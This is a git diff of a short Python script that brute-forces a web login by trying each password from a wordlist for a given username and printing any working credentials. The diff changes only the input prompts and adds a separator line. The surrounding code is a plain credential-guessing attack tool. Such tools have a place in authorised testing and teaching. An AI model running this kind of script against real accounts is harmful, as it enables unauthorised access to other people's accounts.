@@ -1,11 +1,11 @@
 import requests
 from termcolor import colored
 
-url = input("Enter page URL: ")
-username = input("Enter username for the account to brute force: ")
-password_file = input("Enter password file to use: ")
-login_fail = input("Enter string that occurs when login fails: ")
-cookie_value = input("Enter cookie value (optional): ")
+url = input("Enter page URL:>> ")
+username = input("Enter username for the account to brute force:>> ")
+password_file = input("Enter password file to use:>> ")
+login_fail = input("Enter string that occurs when login fails:>> ")
+cookie_value = input("Enter cookie value (optional):>> ")
 
 def cracking(username, url, passwords):
     for password in passwords:
@@ -20,6 +20,7 @@ def cracking(username, url, passwords):
         if login_fail in response.content.decode():
             pass
         else:
+            print("**********************************************")
             print(colored("Found username: " + username, "blue"))
             print(colored("Found password: " + password, "blue"))
             return  
